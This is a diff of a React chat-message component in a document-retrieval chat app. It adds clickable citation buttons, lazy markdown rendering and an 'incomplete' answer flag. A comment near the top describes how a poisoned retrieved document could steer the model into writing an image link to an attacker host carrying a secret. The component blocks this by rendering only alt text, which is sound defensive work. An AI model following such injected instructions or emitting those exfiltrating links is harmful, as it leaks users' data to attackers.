@@ -1,26 +1,31 @@
-import { memo, useEffect, useRef, useState } from 'react';
-import ReactMarkdown, { type Components } from 'react-markdown';
-import remarkGfm from 'remark-gfm';
+import { memo, useEffect, useMemo, useRef, useState } from 'react';
+import type { ReactNode } from 'react';
+import type { Components } from 'react-markdown';
 import type { CitationResponse, FeedbackRating, TimingsResponse } from '../api/types';
 import { withCitationFootnotes } from '../utils/exportChat';
+import { citationNumberFromHref, linkCitations } from '../utils/citations';
 import CitationCard from './CitationCard';
+import { useMarkdownRenderer } from './markdownLoader';
 import StreamingSkeleton from './StreamingSkeleton';
 import './ChatMessage.css';
 
-const REMARK_PLUGINS = [remarkGfm];
 // Answers quote retrieved documents, and a poisoned document can steer the model into
 // writing `![](https://attacker/?q=<secret>)` — which the browser would fetch the moment
 // it rendered, no click needed. Show the alt text instead of loading anything.
 const MARKDOWN_COMPONENTS: Components = {
   img: ({ alt }) => (alt ? <span className="chat-message__image-alt">[{alt}]</span> : null),
-  // A link followed in this tab used to unload the app mid-answer. `noreferrer` also
-  // keeps the DocRAG URL out of wherever a document's link points.
-  a: ({ href, children }) => (
+  a: ({ href, children }) => <ExternalLink href={href}>{children}</ExternalLink>,
+};
+
+// A link followed in this tab used to unload the app mid-answer. `noreferrer` also
+// keeps the DocRAG URL out of wherever a document's link points.
+function ExternalLink({ href, children }: { href?: string; children?: ReactNode }) {
+  return (
     <a href={href} target="_blank" rel="noopener noreferrer">
       {children}
     </a>
-  ),
-};
+  );
+}
 // Error turns created before this page load are history, not news: announcing each one
 // as an alert on every conversation switch or reload read out stale failures.
 const SESSION_STARTED_AT = Date.now();
@@ -50,8 +55,13 @@ export interface ChatTurn {
   feedback?: FeedbackRating;
   // Stopped by the user partway: the content is a fragment, not the whole answer.
   stopped?: boolean;
+  // Cut off by a failed connection partway: also a fragment (the error turn after it
+  // carries the Retry).
+  incomplete?: boolean;
   // Served from the server's answer cache rather than generated for this question.
   cached?: boolean;
+  // The model that was asked (absent on answers saved before this was recorded).
+  model?: string;
 }
 
 interface ChatMessageProps {
@@ -185,6 +195,40 @@ function ChatMessage({
   };
 
   const showSkeleton = streamStage !== undefined && turn.content === '';
+  const Markdown = useMarkdownRenderer();
+  // [n] markers become buttons that open (and on hover preview) the source they cite.
+  const markdownComponents = useMemo<Components>(() => {
+    const byNumber = new Map(turn.sources.map((source) => [source.source_number, source]));
+    return {
+      ...MARKDOWN_COMPONENTS,
+      a: ({ href, children }) => {
+        const number = citationNumberFromHref(href);
+        if (number === null) return <ExternalLink href={href}>{children}</ExternalLink>;
+        const source = byNumber.get(number);
+        if (!source) return <>[{number}]</>;
+        return (
+          <button
+            type="button"
+            className="chat-message__cite"
+            onClick={() => {
+              onCitationLeave?.();
+              onOpenSource?.(source.filename, source.chunk_id);
+            }}
+            onMouseEnter={() => onCitationHover?.(source)}
+            onMouseLeave={onCitationLeave}
+            aria-label={`Source ${number}: ${source.filename}, page ${source.page}`}
+            data-testid="inline-citation"
+          >
+            {number}
+          </button>
+        );
+      },
+    };
+  }, [turn.sources, onOpenSource, onCitationHover, onCitationLeave]);
+  const linkedContent = useMemo(() => {
+    const highest = turn.sources.reduce((max, source) => Math.max(max, source.source_number), 0);
+    return linkCitations(turn.content, highest);
+  }, [turn.content, turn.sources]);
   const timings = turn.timings;
   const showMeta = engineerMode && turn.role === 'assistant' && !showSkeleton && timings !== null;
 
@@ -262,28 +306,36 @@ function ChatMessage({
             A
           </span>
           <div className="chat-message__answer">
-            <span className="chat-message__status" role="status">
-              {streamStage !== undefined
-                ? showSkeleton
-                  ? streamStage
-                  : 'Answer streaming.'
-                : turn.content
-                  ? 'Answer ready.'
-                  : ''}
-            </span>
             {showSkeleton ? (
               <StreamingSkeleton stage={streamStage} />
             ) : (
               <div className="chat-message__markdown">
-                <ReactMarkdown remarkPlugins={REMARK_PLUGINS} components={MARKDOWN_COMPONENTS}>
-                  {turn.content}
-                </ReactMarkdown>
+                {Markdown ? (
+                  <Markdown
+                    text={linkedContent}
+                    components={markdownComponents}
+                    streaming={streamStage !== undefined}
+                  />
+                ) : (
+                  // The raw answer, not linkedContent: its citation links would show as
+                  // "[1](#docrag-cite-1)" until the renderer arrives.
+                  <p className="chat-message__plain">{turn.content}</p>
+                )}
               </div>
             )}
             <div className="chat-message__meta-row">
               {turn.stopped && (
                 <span className="chat-message__flag" data-testid="chat-message-stopped">
                   stopped
+                </span>
+              )}
+              {turn.incomplete && (
+                <span
+                  className="chat-message__flag"
+                  title="The connection failed before this answer finished"
+                  data-testid="chat-message-incomplete"
+                >
+                  incomplete
                 </span>
               )}
               {turn.cached && (
@@ -311,7 +363,7 @@ function ChatMessage({
                   {copied ? 'Copied' : copyFailed ? 'Copy failed' : 'Copy'}
                 </button>
               )}
-              {turn.content && regenerateQuestion && onRetry && !streamStage && (
+              {turn.content && regenerateQuestion && onRetry && !streamStage && !turn.incomplete && (
                 <button
                   type="button"
                   className="chat-message__regenerate"
@@ -322,7 +374,12 @@ function ChatMessage({
                   Regenerate
                 </button>
               )}
-              {turn.content && feedbackEnabled && regenerateQuestion && onFeedback && !streamStage && (
+              {turn.content &&
+                feedbackEnabled &&
+                regenerateQuestion &&
+                onFeedback &&
+                !streamStage &&
+                !turn.incomplete && (
                 <div className="chat-message__feedback" role="group" aria-label="Rate this answer">
                   <button
                     type="button"
@@ -370,7 +427,7 @@ function ChatMessage({
             {showMeta && timings && (
               <div className="chat-message__engineer-meta mono">
                 <span>{formatDuration(timings.total_ms)}</span>
-                {currentModelLabel && <span>{currentModelLabel}</span>}
+                {(turn.model ?? currentModelLabel) && <span>{turn.model ?? currentModelLabel}</span>}
               </div>
             )}
           </div>
